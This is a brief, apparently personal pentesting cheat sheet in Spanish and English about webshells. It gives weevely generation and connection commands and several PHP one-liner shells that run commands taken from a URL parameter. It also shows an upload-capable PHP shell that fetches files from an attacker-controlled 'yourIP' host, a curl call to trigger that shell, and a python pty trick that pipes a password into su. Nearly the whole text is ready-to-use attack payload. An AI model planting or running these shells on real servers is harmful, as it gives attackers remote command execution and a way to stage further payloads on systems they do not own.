<h1 id="1-full-webshells">1 full webshells</h1>
<hr />
<h2 id="weevely">Weevely</h2>
<p>genera webshells</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>weevely generate password /tmp/payload.php
</code></pre></div></div>
<p>despues lo llamamos con :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>weevely http://192.168.1.2/location_of_payload password
</code></pre></div></div>
<h2 id="kali">kali</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/webshells/
</code></pre></div></div>

<h1 id="2-lite-webshells">2 lite webshells</h1>
<hr />

<h2 id="php-web-shells">PHP web shells</h2>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;? passthru($_GET["cmd"]); ?&gt;
</code></pre></div></div>

<h2 id="php-with-upload">php with upload</h2>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'fupload'</span><span class="p">]))</span> <span class="p">{</span>
  <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'fupload'</span><span class="p">],</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"http://yourIP/"</span> <span class="o">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'fupload'</span><span class="p">]));</span>
 <span class="p">};</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]))</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
 <span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>then the above can be accessed by</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl  http://IP/shell.php?fupload=filename_on_your_webserver
</code></pre></div></div>

<p><strong>if running whoami we get the error:  ‘standard in must be a tty’ we can try:</strong></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"
</code></pre></div></div>
